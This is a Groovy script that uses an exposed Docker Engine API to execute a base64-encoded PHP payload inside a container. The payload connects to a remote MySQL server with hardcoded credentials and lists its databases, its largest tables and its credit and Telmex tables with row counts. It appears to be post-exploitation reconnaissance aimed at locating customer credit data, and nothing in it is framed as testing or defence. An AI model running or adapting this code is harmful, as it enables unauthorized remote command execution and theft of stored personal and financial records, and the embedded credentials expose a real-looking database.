import groovy.json.JsonSlurper
import groovy.json.JsonOutput

def dHost = "172.27.140.148"
def dPort = 4243
def cid = "5b32e909c295"

def phpB64 = java.util.Base64.encoder.encodeToString('''<?php
$c=new mysqli("187.191.91.37","adaxxidb","JTQ6PrkecY3y1kVN","tienda",3306);
if($c->connect_error){die("FAIL:".$c->connect_error);}

// All credito_clarotel_* and telmex tables with row counts
echo "=== ALL CREDIT/TELMEX TABLES WITH ROW COUNTS ===\n";
$r=$c->query("SELECT TABLE_SCHEMA,TABLE_NAME,TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_NAME LIKE 'credito_clarotel_%' OR TABLE_NAME LIKE 'telmex_%' ORDER BY TABLE_SCHEMA,TABLE_ROWS DESC");
if($r && $r->num_rows>0){
    echo "schema|table|rows\n";
    while($row=$r->fetch_row()){echo "$row[0]|$row[1]|$row[2]\n";}
}else{echo "ERR:".$c->error."\n";}

// Also show other interesting tables in tienda DB
echo "\n=== ALL TABLES IN tienda DB (top 50 by rows) ===\n";
$r2=$c->query("SELECT TABLE_NAME,TABLE_ROWS FROM information_schema.TABLES WHERE TABLE_SCHEMA='tienda' AND TABLE_ROWS IS NOT NULL ORDER BY TABLE_ROWS DESC LIMIT 50");
if($r2){
    echo "table|rows\n";
    while($row=$r2->fetch_row()){echo "$row[0]|$row[1]\n";}
}

// Show all databases
echo "\n=== ALL DATABASES ===\n";
$r3=$c->query("SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('information_schema','mysql','performance_schema','sys') ORDER BY schema_name");
while($row=$r3->fetch_row()){echo $row[0]."\n";}

$c->close();
?>'''.getBytes("UTF-8"))

def url1 = new URL("http://${dHost}:${dPort}/containers/${cid}/exec")
def c1 = url1.openConnection()
c1.setRequestMethod("POST")
c1.setDoOutput(true)
c1.setRequestProperty("Content-Type", "application/json")
c1.setConnectTimeout(5000)
c1.setReadTimeout(20000)
def b1 = JsonOutput.toJson([AttachStdout: true, AttachStderr: true, Cmd: ["bash", "-c", "echo ${phpB64} | base64 -d > /tmp/tqtables.php && php /tmp/tqtables.php"]])
c1.outputStream.write(b1.bytes)
c1.outputStream.flush()
def r1 = new JsonSlurper().parseText(c1.inputStream.text)
def eid1 = r1.Id

def su1 = new URL("http://${dHost}:${dPort}/exec/${eid1}/start")
def sc1 = su1.openConnection()
sc1.setRequestMethod("POST")
sc1.setDoOutput(true)
sc1.setRequestProperty("Content-Type", "application/json")
sc1.setConnectTimeout(5000)
sc1.setReadTimeout(30000)
sc1.outputStream.write('{"Detach":false,"Tty":true}'.bytes)
sc1.outputStream.flush()
println sc1.inputStream.text
